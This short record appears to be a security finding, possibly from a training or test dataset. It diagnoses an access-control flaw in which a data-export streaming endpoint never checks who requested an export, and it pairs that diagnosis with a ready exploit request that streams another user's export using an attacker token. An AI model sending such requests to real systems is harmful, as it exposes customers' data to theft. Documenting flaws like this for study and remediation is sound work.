diagnosis: The chunked-transfer streaming endpoint downloads database export collections by exportId without checking whether exportMeta.requestedBy matches req.user.id. Any user can intercept and stream massive customer data exports triggered by administrators.
exploit_request:
GET /api/exports/65b6100a9102481023a09124/stream-ndjson HTTP/1.1
Host: exports.datawarehouse.io
Authorization: Bearer <attacker_jwt>
